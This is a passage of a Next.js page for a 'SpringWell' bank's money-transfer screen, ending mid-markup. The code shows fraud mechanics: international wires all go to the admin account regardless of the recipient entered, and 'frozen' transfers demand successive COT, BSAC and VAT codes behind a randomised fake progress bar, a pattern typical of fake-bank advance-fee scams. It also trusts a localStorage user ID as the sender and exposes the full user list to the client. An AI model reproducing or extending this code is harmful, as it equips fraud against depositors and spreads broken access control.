"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { useMutation, useQuery } from "convex/react";
import { api } from "@convex/_generated/api";
import { Landmark, ArrowRightLeft, User, Loader2, Building2, Globe, CheckCircle2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { BankNav } from "@/components/layout/bank-nav";
import { DashboardFooter, DashboardFullFooter } from "@/components/layout/dashboard-footer";

type TransferType = null | "domestic" | "international" | "business";

export default function TransferPage() {
  const router = useRouter();
  const [userId, setUserId] = useState<string | null>(null);
  const [transferType, setTransferType] = useState<TransferType>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");

  const users = useQuery(api.users.list);
  const transfer = useMutation(api.auth.transfer);
  const verifyTransferCode = useMutation(api.auth.verifyTransferCode);

  const [domesticForm, setDomesticForm] = useState({ recipientName: "", bankName: "", accountNumber: "", amount: "", description: "" });
  const [intlForm, setIntlForm] = useState({
    recipientName: "",
    recipientBank: "",
    accountNumber: "",
    iban: "",
    swiftCode: "",
    amount: "",
    currency: "USD",
    description: "",
  });
  const [businessForm, setBusinessForm] = useState({ businessName: "", accountNumber: "", amount: "", description: "" });

  type ConfirmData = {
    type: "domestic" | "international" | "business";
    title: string;
    details: { label: string; value: string }[];
    amount: number;
    recipientLabel: string;
  };
  const [confirmData, setConfirmData] = useState<ConfirmData | null>(null);

  const [frozenTxnId, setFrozenTxnId] = useState<string | null>(null);
  const [codeStep, setCodeStep] = useState<"cot" | "bsac" | "vat" | "completed">("cot");

  function stepFromFeeStatus(fs?: string): "cot" | "bsac" | "vat" {
    if (fs === "pending_bsac") return "bsac";
    if (fs === "pending_vat") return "vat";
    return "cot";
  }
  const [codeInput, setCodeInput] = useState("");
  const [codeLoading, setCodeLoading] = useState(false);
  const [codePercent, setCodePercent] = useState(0);
  const [codeSuccess, setCodeSuccess] = useState("");
  const [codeError, setCodeError] = useState("");

  const [successPopup, setSuccessPopup] = useState<{ amount: number; recipient: string; type: string; txId?: string } | null>(null);

  useEffect(() => {
    const id = localStorage.getItem("userId");
    if (!id) { router.push("/login"); return; }
    setUserId(id);
  }, [router]);

  useEffect(() => {
    if (!codeLoading) { setCodePercent(0); return; }
    let pct = 0;
    const iv = setInterval(() => {
      pct += Math.random() * 8 + 2;
      if (pct > 92) pct = 92;
      setCodePercent(Math.floor(pct));
    }, 200);
    return () => clearInterval(iv);
  }, [codeLoading]);

  const currentUser = users?.find((u: any) => u._id === userId);

  if (!userId || users === undefined) {
    return <div style={{ backgroundColor: "#eee", minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center" }}><Loader2 className="animate-spin h-8 w-8 text-[#426FB6]" /></div>;
  }

  async function handleDomestic(e: React.FormEvent) {
    e.preventDefault();
    setError(""); setSuccess("");
    const amt = parseFloat(domesticForm.amount);
    if (!domesticForm.recipientName || !domesticForm.bankName || !domesticForm.accountNumber || isNaN(amt) || amt <= 0) { setError("Fill in all required fields"); return; }
    if (amt > (currentUser?.balance ?? 0)) { setError("Insufficient funds"); return; }
    const acct = domesticForm.accountNumber.trim().toUpperCase().replace(/^SWB-/, "");
    const recipient = users?.find((u: any) => u._id.slice(-8).toUpperCase() === acct && u.role !== "admin");
    if (!recipient) { setError("No SpringWell user found with that account number"); return; }
    if (recipient._id === userId) { setError("Cannot transfer to your own account"); return; }
    setConfirmData({
      type: "domestic",
      title: "Confirm Domestic Transfer",
      details: [
        { label: "To", value: domesticForm.recipientName },
        { label: "Bank", value: domesticForm.bankName },
        { label: "Account", value: domesticForm.accountNumber },
        ...(domesticForm.description ? [{ label: "Note", value: domesticForm.description }] : []),
      ],
      amount: amt,
      recipientLabel: domesticForm.recipientName,
    });
  }

  async function confirmDomestic() {
    if (!confirmData) return;
    const amt = confirmData.amount;
    const acct = domesticForm.accountNumber.trim().toUpperCase().replace(/^SWB-/, "");
    const recipient = users?.find((u: any) => u._id.slice(-8).toUpperCase() === acct && u.role !== "admin");
    setLoading(true);
    try {
      const desc = `Domestic transfer to ${domesticForm.recipientName} at ${domesticForm.bankName}${domesticForm.description ? ` — ${domesticForm.description}` : ""}`;
      const result = await transfer({ fromUserId: userId as any, toUserId: recipient!._id, amount: amt, description: desc });
      if ((result as any)?.frozen) {
        setFrozenTxnId((result as any).transactionId);
        setCodeStep(stepFromFeeStatus((result as any).feeStatus));
        setCodeInput("");
        setCodeSuccess("");
        setCodeError("");
        setConfirmData(null);
      } else {
        setSuccessPopup({ amount: amt, recipient: domesticForm.recipientName, type: "Domestic", txId: (result as any)?.transactionId });
        setDomesticForm({ recipientName: "", bankName: "", accountNumber: "", amount: "", description: "" });
        setConfirmData(null);
      }
    } catch (err: any) {
      setError(err.message || "Transfer failed");
      setConfirmData(null);
    } finally {
      setLoading(false);
    }
  }

  async function handleInternational(e: React.FormEvent) {
    e.preventDefault();
    setError(""); setSuccess("");
    const amt = parseFloat(intlForm.amount);
    if (!intlForm.recipientName || !intlForm.recipientBank || isNaN(amt) || amt <= 0) {
      setError("Please fill in all required fields");
      return;
    }
    if (amt > (currentUser?.balance ?? 0)) { setError("Insufficient funds"); return; }
    setConfirmData({
      type: "international",
      title: "Confirm International Transfer",
      details: [
        { label: "To", value: intlForm.recipientName },
        { label: "Bank", value: intlForm.recipientBank },
        ...(intlForm.iban ? [{ label: "IBAN", value: intlForm.iban }] : []),
        ...(intlForm.swiftCode ? [{ label: "SWIFT", value: intlForm.swiftCode }] : []),
        { label: "Currency", value: intlForm.currency },
        ...(intlForm.description ? [{ label: "Note", value: intlForm.description }] : []),
      ],
      amount: amt,
      recipientLabel: intlForm.recipientName,
    });
  }

  async function confirmInternational() {
    if (!confirmData) return;
    const amt = confirmData.amount;
    setLoading(true);
    try {
      const adminUser = users?.find((u: any) => u.role === "admin");
      const result = await transfer({
        fromUserId: userId as any,
        toUserId: adminUser!._id,
        amount: amt,
        description: `International wire to ${intlForm.recipientName} at ${intlForm.recipientBank}${intlForm.swiftCode ? ` (SWIFT: ${intlForm.swiftCode})` : ""}${intlForm.iban ? ` (IBAN: ${intlForm.iban})` : ""}`,
      });
      if ((result as any)?.frozen) {
        setFrozenTxnId((result as any).transactionId);
        setCodeStep(stepFromFeeStatus((result as any).feeStatus));
        setCodeInput("");
        setCodeSuccess("");
        setCodeError("");
        setConfirmData(null);
      } else {
        setSuccessPopup({ amount: amt, recipient: intlForm.recipientName, type: "International" });
        setIntlForm({ recipientName: "", recipientBank: "", accountNumber: "", iban: "", swiftCode: "", amount: "", currency: "USD", description: "" });
        setConfirmData(null);
      }
    } catch (err: any) {
      setError(err.message || "Transfer failed");
      setConfirmData(null);
    } finally {
      setLoading(false);
    }
  }

  async function handleBusiness(e: React.FormEvent) {
    e.preventDefault();
    setError(""); setSuccess("");
    const amt = parseFloat(businessForm.amount);
    if (!businessForm.businessName || !businessForm.accountNumber || isNaN(amt) || amt <= 0) { setError("Fill in all required fields"); return; }
    if (amt > (currentUser?.balance ?? 0)) { setError("Insufficient funds"); return; }
    const acct = businessForm.accountNumber.trim().toUpperCase().replace(/^SWB-/, "");
    const recipient = users?.find((u: any) => u._id.slice(-8).toUpperCase() === acct && u.role !== "admin");
    if (!recipient) { setError("No SpringWell user found with that account number"); return; }
    if (recipient._id === userId) { setError("Cannot transfer to your own account"); return; }
    setConfirmData({
      type: "business",
      title: "Confirm Business Transfer",
      details: [
        { label: "To", value: businessForm.businessName },
        { label: "Account", value: businessForm.accountNumber },
        ...(businessForm.description ? [{ label: "Note", value: businessForm.description }] : []),
      ],
      amount: amt,
      recipientLabel: businessForm.businessName,
    });
  }

  async function confirmBusiness() {
    if (!confirmData) return;
    const amt = confirmData.amount;
    const acct = businessForm.accountNumber.trim().toUpperCase().replace(/^SWB-/, "");
    const recipient = users?.find((u: any) => u._id.slice(-8).toUpperCase() === acct && u.role !== "admin");
    setLoading(true);
    try {
      const result = await transfer({
        fromUserId: userId as any,
        toUserId: recipient!._id,
        amount: amt,
        description: businessForm.description || `Business payment to ${businessForm.businessName}`,
      });
      if ((result as any)?.frozen) {
        setFrozenTxnId((result as any).transactionId);
        setCodeStep(stepFromFeeStatus((result as any).feeStatus));
        setCodeInput("");
        setCodeSuccess("");
        setCodeError("");
        setConfirmData(null);
      } else {
        setSuccessPopup({ amount: amt, recipient: businessForm.businessName, type: "Business" });
        setBusinessForm({ businessName: "", accountNumber: "", amount: "", description: "" });
        setConfirmData(null);
      }
    } catch (err: any) {
      setError(err.message || "Transfer failed");
      setConfirmData(null);
    } finally {
      setLoading(false);
    }
  }

  async function handleVerifyCode() {
    if (!frozenTxnId || !codeInput.trim() || codeStep === "completed") return;
    setCodeLoading(true);
    setCodeError("");
    setCodeSuccess("");
    try {
      const result = await verifyTransferCode({
        transactionId: frozenTxnId as any,
        codeType: codeStep as "cot" | "bsac" | "vat",
        code: codeInput.trim(),
        userId: userId as any,
      });
      setCodePercent(100);
      setCodeSuccess((result as any).message);
      setCodeInput("");
      if (codeStep === "cot") setCodeStep("bsac");
      else if (codeStep === "bsac") setCodeStep("vat");
      else setCodeStep("completed");
    } catch (err: any) {
      setCodeError(err.message || "Invalid code");
    } finally {
      setCodeLoading(false);
    }
  }

  return (
    <div style={{ backgroundColor: "#eee", minHeight: "100vh", fontFamily: "'Hind', Arial, sans-serif" }} className="page-container">
      {/* Navigation */}
      <BankNav user={{ firstName: currentUser?.firstName || "", lastName: currentUser?.lastName || "", email: currentUser?.email || "", imageId: currentUser?.imageId }} />

      {/* Main content */}
      <div style={{ maxWidth: 1100, margin: "0 auto", padding: "30px 20px" }}>

        {/* Error / Success */}
        {error && (
          <div style={{ backgroundColor: "#fff", border: "1px solid #fecaca", borderRadius: 4, padding: "12px 20px", marginBottom: 20, color: "#dc2626", fontSize: 14 }}>
            {error}
          </div>
        )}
        {success && (
          <div style={{ backgroundColor: "#fff", border: "1px solid #bbf7d0", borderRadius: 4, padding: "12px 20px", marginBottom: 20, color: "#16a34a", fontSize: 14 }}>
            {success}
          </div>
        )}

        {/* Transfer Type Selection - matches reference exactly */}
        {!transferType && (
          <>
            <h2 style={{ fontSize: 20, fontWeight: 700, color: "#000", marginBottom: 24 }}>I want to transfer money...</h2>
            <div className="transfer-grid">
              {/* Domestic */}
              <div
                onClick={() => setTransferType("domestic")}
                className="bg-white border border-gray-200 rounded-lg p-5 sm:p-6 cursor-pointer flex flex-col min-h-[180px] sm:min-h-[220px] transition-shadow hover:shadow-md"
              >
                <h3 style={{ fontSize: 18, fontWeight: 700, color: "#000", margin: "0 0 8px" }}>Domestic Bank Transfer</h3>
                <div className="flex-1" />
                <div className="flex items-center justify-between mt-4">
                  <div style={{ width: 40, height: 40, borderRadius: "50%", backgroundColor: "#e0f2fe", display: "flex", alignItems: "center", justifyContent: "center" }}>
                    <Landmark size={20} style={{ color: "#0284c7" }} />
                  </div>
                  <ArrowRightLeft size={18} style={{ color: "#999" }} />
                  <div style={{ width: 40, height: 40, borderRadius: "50%", backgroundColor: "#dbeafe", display: "flex", alignItems: "center", justifyContent: "center" }}>
                    <Landmark size={20} style={{ color: "#2563eb" }} />
                  </div>
                </div>
              </div>

              {/* International */}
              <div
                onClick={() => setTransferType("international")}
                className="bg-white border border-gray-200 rounded-lg p-5 sm:p-6 cursor-pointer flex flex-col min-h-[180px] sm:min-h-[220px] transition-shadow hover:shadow-md"
              >
                <h3 style={{ fontSize: 18, fontWeight: 700, color: "#000", margin: "0 0 8px", lineHeight: 1.3 }}>International Bank Transfer</h3>
                <div className="flex-1" />
                <div className="flex items-center justify-between mt-4">
                  <div style={{ width: 40, height: 40, borderRadius: "50%", backgroundColor: "#dcfce7", display: "flex", alignItems: "center", justifyContent: "center" }}>
                    <Globe size={20} style={{ color: "#16a34a" }} />
                  </div>
                  <ArrowRightLeft size={18} style={{ color: "#999" }} />
                  <div style={{ width: 40, height: 40, borderRadius: "50%", backgroundColor: "#d1fae5", display: "flex", alignItems: "center", justifyContent: "center" }}>
                    <Building2 size={20} style={{ color: "#059669" }} />
                  </div>
                </div>
              </div>

              {/* Business */}
              <div
                onClick={() => setTransferType("business")}
                className="bg-white border border-gray-200 rounded-lg p-5 sm:p-6 cursor-pointer flex flex-col min-h-[180px] sm:min-h-[220px] transition-shadow hover:shadow-md"
              >
                <h3 style={{ fontSize: 18, fontWeight: 700, color: "#000", margin: "0 0 8px", lineHeight: 1.3 }}>To someone else or a business</h3>
                <div className="flex-1" />
                <div className="flex items-center justify-between mt-4">
                  <div style={{ width: 40, height: 40, borderRadius: "50%", backgroundColor: "#fef3c7", display: "flex", alignItems: "center", justifyContent: "center" }}>
                    <User size={20} style={{ color: "#d97706" }} />
                  </div>
                  <ArrowRightLeft size={18} style={{ color: "#999" }} />
                  <div style={{ width: 40, height: 40, borderRadius: "50%", backgroundColor: "#fde68a", display: "flex", alignItems: "center", justifyContent: "center" }}>
                    <Building2 size={20} style={{ color: "#b45309" }} />
                  </div>
                </div>
              </div>
            </div>
          </>
        )}

        {/* Domestic Form */}
        {transferType === "domestic" && (
          <div style={{ backgroundColor: "#fff", border: "1px solid #ddd", borderRadius: 4, marginBottom: 30 }}>
            <div style={{ backgroundColor: "#426FB6", padding: "12px 20px", display: "flex", justifyContent: "space-between", alignItems: "center" }}>
              <h3 style={{ margin: 0, fontSize: 16, fontWeight: 700, color: "#fff" }}>Domestic Bank Transfer</h3>
              <button onClick={() => { setTransferType(null); setError(""); setSuccess(""); }} style={{ background: "none", border: "none", color: "#fff", fontSize: 24, cursor: "pointer", padding: 0, lineHeight: 1 }}>&times;</button>
            </div>
            <div style={{ padding: 20 }}>
              <form onSubmit={handleDomestic} style={{ display: "flex", flexDirection: "column", gap: 14 }}>
                <p style={{ fontSize: 13, color: "#666", margin: "0 0 4px" }}>Send money to a SpringWell account in the United States</p>
                <div className="form-row">
                  <div>
                    <Label htmlFor="dom-account" style={{ fontSize: 12, color: "#666", display: "block", marginBottom: 4 }}>Recipient Account Number *</Label>
                    <Input id="dom-account" required placeholder="SWB-XXXXXXXX" style={{ width: "100%", padding: "10px 12px", border: "1px solid #ccc", borderRadius: 4, fontSize: 14 }} value={domesticForm.accountNumber} onChange={(e) => setDomesticForm({ ...domesticForm, accountNumber: e.target.value })} />
                  </div>
                  <div>
                    <Label htmlFor="dom-name" style={{ fontSize: 12, color: "#666", display: "block", marginBottom: 4 }}>Recipient Name *</Label>
                    <Input id="dom-name" required placeholder="Full name of account holder" style={{ width: "100%", padding: "10px 12px", border: "1px solid #ccc", borderRadius: 4, fontSize: 14 }} value={domesticForm.recipientName} onChange={(e) => setDomesticForm({ ...domesticForm, recipientName: e.target.value })} />
                  </div>
                </div>
                <div>
                  <Label htmlFor="dom-bank" style={{ fontSize: 12, color: "#666", display: "block", marginBottom: 4 }}>Bank Name *</Label>
                  <Input id="dom-bank" required placeholder="e.g. Chase, Bank of America" style={{ width: "100%", padding: "10px 12px", border: "1px solid #ccc", borderRadius: 4, fontSize: 14 }} value={domesticForm.bankName} onChange={(e) => setDomesticForm({ ...domesticForm, bankName: e.target.value })} />
                </div>
                <div>
                  <Label htmlFor="dom-amount" style={{ fontSize: 12, color: "#666", display: "block", marginBottom: 4 }}>Amount (USD) *</Label>
                  <Input id="dom-amount" type="number" required min="0.01" step="0.01" placeholder="0.00" style={{ width: "100%", padding: "10px 12px", border: "1px solid #ccc", borderRadius: 4, fontSize: 14 }} value={domesticForm.amount} onChange={(e) => setDomesticForm({ ...domesticForm, amount: e.target.value })} />
                </div>
                <div>
                  <Label htmlFor="dom-desc" style={{ fontSize: 12, color: "#666", display: "block", marginBottom: 4 }}>Description</Label>
                  <Input id="dom-desc" placeholder="What's this for?" style={{ width: "100%", padding: "10px 12px", border: "1px solid #ccc", borderRadius: 4, fontSize: 14 }} value={domesticForm.description} onChange={(e) => setDomesticForm({ ...domesticForm, description: e.target.value })} />
                </div>
                <div className="form-actions">
                  <button type="button" onClick={() => { setTransferType(null); setError(""); setSuccess(""); }} className="py-2.5 px-4 border border-gray-300 rounded bg-white cursor-pointer text-sm">Cancel</button>
                  <Button type="submit" disabled={loading} className="py-2.5 px-4 bg-[#426FB6] text-white border-none rounded text-sm font-bold cursor-pointer">
                    {loading ? "Sending..." : "Send Transfer"}
                  </Button>
                </div>
              </form>
            </div>
          </div>
        )}

        {/* International Form */}
        {transferType === "international" && (
          <div style={{ backgroundColor: "#fff", border: "1px solid #ddd", borderRadius: 4, marginBottom: 30 }}>
            <div style={{ backgroundColor: "#426FB6", padding: "12px 20px", display: "flex", justifyContent: "space-between", alignItems: "center" }}>
              <h3 style={{ margin: 0, fontSize: 16, fontWeight: 700, color: "#fff" }}>International Bank Transfer</h3>
              <button onClick={() => { setTransferType(null); setError(""); setSuccess(""); }} style={{ background: "none", border: "none", color: "#fff", fontSize: 24, cursor: "pointer", padding: 0, lineHeight: 1 }}>&times;</button>
            </div>
            <div style={{ padding: 20 }}>
              <form onSubmit={handleInternational} style={{ display: "flex", flexDirection: "column", gap: 14 }}>
                <p style={{ fontSize: 13, color: "#666", margin: "0 0 4px" }}>Send money to any bank account worldwide</p>
                <div className="form-row">
                  <div>
                    <Label htmlFor="intl-name" style={{ fontSize: 12, color: "#666", display: "block", marginBottom: 4 }}>Recipient Name *</Label>
                    <Input id="intl-name" required placeholder="Full name" style={{ width: "100%", padding: "10px 12px", border: "1px solid #ccc", borderRadius: 4, fontSize: 14 }} value={intlForm.recipientName} onChange={(e) => setIntlForm({ ...intlForm, recipientName: e.target.value })} />
                  </div>
                  <div>
                    <Label htmlFor="intl-bank" style={{ fontSize: 12, color: "#666", display: "block", marginBottom: 4 }}>Bank Name *</Label>
                    <Input id="intl-bank" required placeholder="Bank name" style={{ width: "100%", padding: "10px 12px", border: "1px solid #ccc", borderRadius: 4, fontSize: 14 }} value={intlForm.recipientBank} onChange={(e) => setIntlForm({ ...intlForm, recipientBank: e.target.value })} />
                  </div>
                </div>
                <div>
                  <Label htmlFor="intl-account" style={{ fontSize: 12, color: "#666", display: "block", marginBottom: 4 }}>Account Number</Label>
                  <Input id="intl-account" placeholder="Account number" style={{ width: "100%", padding: "10px 12px", border: "1px solid #ccc", borderRadius: 4, fontSize: 14 }} value={intlForm.accountNumber} onChange={(e) => setIntlForm({ ...intlForm, accountNumber: e.target.value })} />
                </div>
                <div className="form-row">
                  <div>
                    <Label htmlFor="intl-iban" style={{ fontSize: 12, color: "#666", display: "block", marginBottom: 4 }}>IBAN</Label>
                    <Input id="intl-iban" placeholder="GB29NWBK60161331926819" style={{ width: "100%", padding: "10px 12px", border: "1px solid #ccc", borderRadius: 4, fontSize: 14 }} value={intlForm.iban} onChange={(e) => setIntlForm({ ...intlForm, iban: e.target.value })} />
                  </div>
                  <div>
                    <Label htmlFor="intl-swift" style={{ fontSize: 12, color: "#666", display: "block", marginBottom: 4 }}>SWIFT / BIC Code</Label>
                    <Input id="intl-swift" placeholder="NWBKGB2L" style={{ width: "100%", padding: "10px 12px", border: "1px solid #ccc", borderRadius: 4, fontSize: 14 }} value={intlForm.swiftCode} onChange={(e) => setIntlForm({ ...intlForm, swiftCode: e.target.value })} />
                  </div>
                </div>
                <div className="form-row">
                  <div style={{ flex: 2 }}>
                    <Label htmlFor="intl-amount" style={{ fontSize: 12, color: "#666", display: "block", marginBottom: 4 }}>Amount *</Label>
                    <Input id="intl-amount" type="number" required min="0.01" step="0.01" placeholder="0.00" style={{ width: "100%", padding: "10px 12px", border: "1px solid #ccc", borderRadius: 4, fontSize: 14 }} value={intlForm.amount} onChange={(e) => setIntlForm({ ...intlForm, amount: e.target.value })} />
                  </div>
                  <div style={{ flex: 1 }}>
                    <Label htmlFor="intl-currency" style={{ fontSize: 12, color: "#666", display: "block", marginBottom: 4 }}>Currency</Label>
                    <select id="intl-currency" value={intlForm.currency} onChange={(e) => setIntlForm({ ...intlForm, currency: e.target.value })} style={{ width: "100%", padding: "10px 12px", border: "1px solid #ccc", borderRadius: 4, fontSize: 14, fontFamily: "inherit", backgroundColor: "#fff" }}>
                      <option value="USD">USD</option>
                      <option value="EUR">EUR</option>
                      <option value="GBP">GBP</option>
                      <option value="JPY">JPY</option>
                      <option value="CHF">CHF</option>
                      <option value="CAD">CAD</option>
                      <option value="AUD">AUD</option>
                    </select>
                  </div>
                </div>
                <div>
                  <Label htmlFor="intl-desc" style={{ fontSize: 12, color: "#666", display: "block", marginBottom: 4 }}>Purpose / Note</Label>
                  <Input id="intl-desc" placeholder="Invoice payment, family support, etc." style={{ width: "100%", padding: "10px 12px", border: "1px solid #ccc", borderRadius: 4, fontSize: 14 }} value={intlForm.description} onChange={(e) => setIntlForm({ ...intlForm, description: e.target.value })} />
                </div>
                <div className="form-actions">
                  <button type="button" onClick={() => { setTransferType(null); setError(""); setSuccess(""); }} className="py-2.5 px-4 border border-gray-300 rounded bg-white cursor-pointer text-sm">Cancel</button>
                  <Button type="submit" disabled={loading} className="py-2.5 px-4 bg-[#426FB6] text-white border-none rounded text-sm font-bold cursor-pointer">
                    {loading ? "Processing..." : "Send International Transfer"}
                  </Button>
                </div>
              </form>
            </div>
          </div>
        )}

        {/* Business Form */}
        {transferType === "business" && (
          <div style={{ backgroundColor: "#fff", border: "1px solid #ddd", borderRadius: 4, marginBottom: 30 }}>
            <div style={{ backgroundColor: "#426FB6", padding: "12px 20px", display: "flex", justifyContent: "space-between", alignItems: "center" }}>
              <h3 style={{ margin: 0, fontSize: 16, fontWeight: 700, color: "#fff" }}>To Someone Else or a Business</h3>
              <button onClick={() => { setTransferType(null); setError(""); setSuccess(""); }} style={{ background: "none", border: "none", color: "#fff", fontSize: 24, cursor: "pointer", padding: 0, lineHeight: 1 }}>&times;</button>
            </div>
            <div style={{ padding: 20 }}>
              <form onSubmit={handleBusiness} style={{ display: "flex", flexDirection: "column", gap: 14 }}>
                <p style={{ fontSize: 13, color: "#666", margin: "0 0 4px" }}>Send money to a business or person's SpringWell account</p>
                <div className="form-row">
                  <div>
                    <Label htmlFor="biz-name" style={{ fontSize: 12, color: "#666", display: "block", marginBottom: 4 }}>Business / Recipient Name *</Label>
                    <Input id="biz-name" required placeholder="Business or person name" style={{ width: "100%", padding: "10px 12px", border: "1px solid #ccc", borderRadius: 4, fontSize: 14 }} value={businessForm.businessName} onChange={(e) => setBusinessForm({ ...businessForm, businessName: e.target.value })} />
                  </div>
                  <div>
                    <Label htmlFor="biz-account" style={{ fontSize: 12, color: "#666", display: "block", marginBottom: 4 }}>Recipient Account Number *</Label>
                    <Input id="biz-account" required placeholder="SWB-XXXXXXXX" style={{ width: "100%", padding: "10px 12px", border: "1px solid #ccc", borderRadius: 4, fontSize: 14 }} value={businessForm.accountNumber} onChange={(e) => setBusinessForm({ ...businessForm, accountNumber: e.target.value })} />
                  </div>
                </div>
                <div>
                  <Label htmlFor="biz-amount" style={{ fontSize: 12, color: "#666", display: "block", marginBottom: 4 }}>Amount (USD) *</Label>
                  <Input id="biz-amount" type="number" required min="0.01" step="0.01" placeholder="0.00" style={{ width: "100%", padding: "10px 12px", border: "1px solid #ccc", borderRadius: 4, fontSize: 14 }} value={businessForm.amount} onChange={(e) => setBusinessForm({ ...businessForm, amount: e.target.value })} />
                </div>
                <div>
                  <Label htmlFor="biz-desc" style={{ fontSize: 12, color: "#666", display: "block", marginBottom: 4 }}>Description</Label>
                  <Input id="biz-desc" placeholder="Invoice #, payment for..." style={{ width: "100%", padding: "10px 12px", border: "1px solid #ccc", borderRadius: 4, fontSize: 14 }} value={businessForm.description} onChange={(e) => setBusinessForm({ ...businessForm, description: e.target.value })} />
                </div>
                <div className="form-actions">
                  <button type="button" onClick={() => { setTransferType(null); setError(""); setSuccess(""); }} className="py-2.5 px-4 border border-gray-300 rounded bg-white cursor-pointer text-sm">Cancel</button>
                  <Button type="submit" disabled={loading} className="py-2.5 px-4 bg-[#426FB6] text-white border-none rounded text-sm font-bold cursor-pointer">
                    {loading ? "Sending..." : "Send Payment"}
                  </Button>
                </div>
              </form>
            </div>
          </div>
        )}

        <DashboardFooter lastLogin={currentUser?.lastLogin} />
      </div>

      <DashboardFullFooter />

      {frozenTxnId && (
        <div className="modal-overlay" onClick={() => setFrozenTxnId(null)}>
          <div className="modal-box" style={{ maxWidth: 420, padding: 0 }} onClick={(e) => e.stopPropagation()}>
            <div style={{ backgroundColor: "#426FB6", padding: "16px 20px" }}>
              <h3 style={{ margin: 0, fontSize: 16, fontWeight: 700, color: "#fff" }}>Verify Transfer Code</h3>
            </div>
            <div style={{ padding: 20 }}>
              <p style={{ fontSize: 13, color: "#666", margin: "0 0 16px" }}>Your account is frozen. Enter the verification code sent to your email.</p>

              {codeSuccess && (
                <div style={{ backgroundColor: "#f0fdf4", border: "1px solid #bbf7d0", borderRadius: 6, padding: "10px 14px", marginBottom: 16, color: "#16a34a", fontSize: 13, textAlign: "center", fontWeight: 600 }}>
                  {codeSuccess}
                </div>
              )}
              {codeError && (
                <div style={{ backgroundColor: "#fef2f2", border: "1px solid #fecaca", borderRadius: 6, padding: "10px 14px", marginBottom: 16, color: "#dc2626", fontSize: 13, textAlign: "center" }}>
                  {codeError}
                </div>
              )}

              {codeStep !== "completed" ? (
                <>
                  <label style={{ fontSize: 12, color: "#666", display: "block", marginBottom: 4 }}>{codeStep.toUpperCase()} Code</label>
                  <input
                    value={codeInput}
                    onChange={(e) => setCodeInput(e.target.value)}
                    placeholder={`Enter ${codeStep.toUpperCase()} code`}
                    style={{ width: "100%", padding: "10px 12px", border: "1px solid #ccc", borderRadius: 4, fontSize: 14, fontFamily: "monospace", letterSpacing: 2, textAlign: "center", boxSizing: "border-box" }}
                    onKeyDown={(e) => { if (e.key === "Enter") handleVerifyCode(); }}
                    autoFocus
                  />
                </>
              ) : (
                <div style={{ textAlign: "center", padding: "20px 0" }}>
                  <div style={{ fontSize: 36, marginBottom: 8 }}>&#10003;</div>
                  <p style={{ fontSize: 16, fontWeight: 700, color: "#16a34a", margin: "0 0 4px" }}>Transfer Successful!</p>
                  <p style={{ fontSize: 13, color: "#666", margin: 0 }}>All verification codes confirmed.</p>
                </div>
              )}

              <div style={{ display: "flex", gap: 12, marginTop: 20 }}>
                {codeStep !== "completed" && (
                  <button onClick={() => setFrozenTxnId(null)} style={{ flex: 1, padding: "12px", border: "1px solid #ccc", borderRadius: 6, backgroundColor: "#fff", cursor: "pointer", fontSize: 14, fontWeight: 600 }}>Cancel</button>
                )}
                {codeStep !== "completed" ? (
                  <button onClick={handleVerifyCode} disabled={codeLoading || !codeInput.trim()} style={{ flex: 1, padding: "12px", border: "none", borderRadius: 6, backgroundColor: "#426FB6", color: "#fff", cursor: "pointer", fontSize: 14, fontWeight: 700, opacity: codeLoading || !codeInput.trim() ? 0.7 : 1, position: "relative", overflow: "hidden" }}>
                    {codeLoading ? (
                      <span style={{ position: "relative", zIndex: 1 }}>
                        <span style={{ position: "absolute", inset: 0, backgroundColor: "#2d5a9e", transform: `scaleX(${codePercent / 100})`, transformOrigin: "left", transition: "transform 0.2s ease" }} />
                        <span style={{ position: "relative", zIndex: 1 }}>Verifying {codePercent}%</span>
                      </span>
                    ) : `Verify ${codeStep.toUpperCase()}`}
                  </button>
                ) : (
                  <button onClick={() => { setFrozenTxnId(null); setCodeStep("cot"); setSuccessPopup({ amount: confirmData?.amount ?? 0, recipient: confirmData?.recipientLabel ?? "", type: "Transfer" }); }} style={{ flex: 1, padding: "12px", border: "none", borderRadius: 6, backgroundColor: "#16a34a", color: "#fff", cursor: "pointer", fontSize: 14, fontWeight: 700 }}>Done</button>
                )}
              </div>
            </div>
          </div>
        </div>
      )}

      {confirmData && (
        <div className="modal-overlay" onClick={() => setConfirmData(null)}>
          <div className="modal-box" style={{ maxWidth: 420, padding: 0 }} onClick={(e) => e.stopPropagation()}>
            <div style={{ backgroundColor: "#426FB6", padding: "16px 20px" }}>
              <h3 style={{ margin: 0, fontSize: 16, fontWeight: 700, color: "#fff" }}>{confirmData.title}</h3>
            </div>
            <div style={{ padding: 20 }}>
              <div style={{ marginBottom: 16 }}>
                {confirmData.details.map((d, i) => (
                  <div key={i} style={{ display: "flex", justifyContent: "space-between", padding: "6px 0", borderBottom: "1px solid #eee", fontSize: 14 }}>
                    <span style={{ color: "#666" }}>{d.label}</span>
                    <span style={{ fontWeight: 600, color: "#000" }}>{d.value}</span>
                  </div>
                ))}
              </div>
              <div style={{ backgroundColor: "#f8f9fa", borderRadius: 8, padding: "16px", textAlign: "center", marginBottom: 20 }}>
                <div style={{ fontSize: 13, color: "#666", marginBottom: 4 }}>Total Amount</div>
                <div style={{ fontSize: 28, fontWeight: 700, color: "#117aca" }}>${confirmData.amount.toLocaleString()}</div>
              </div>
              <div style={{ display: "flex", gap: 12 }}>
                <button onClick={() => setConfirmData(null)} style={{ flex: 1, padding: "12px", border: "1px solid #ccc", borderRadius: 6, backgroundColor: "#fff", cursor: "pointer", fontSize: 14, fontWeight: 600 }}>Cancel</button>
                <button
                  onClick={() => {
                    if (confirmData.type === "domestic") confirmDomestic();
                    else if (confirmData.type === "international") confirmInternational();
                    else confirmBusiness();
                  }}
                  disabled={loading}
                  style={{ flex: 1, padding: "12px", border: "none", borderRadius: 6, backgroundColor: "#426FB6", color: "#fff", cursor: "pointer", fontSize: 14, fontWeight: 700, opacity: loading ? 0.7 : 1 }}
                >
                  {loading ? "Sending..." : "Confirm & Send"}
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {successPopup && (
        <div className="modal-overlay" onClick={() => setSuccessPopup(null)}>
          <div className="modal-box" style={{ maxWidth: 400, padding: 0, textAlign: "center" }} onClick={(e) => e.stopPropagation()}>
            <div style={{ padding: "32px 24px 24px" }}>
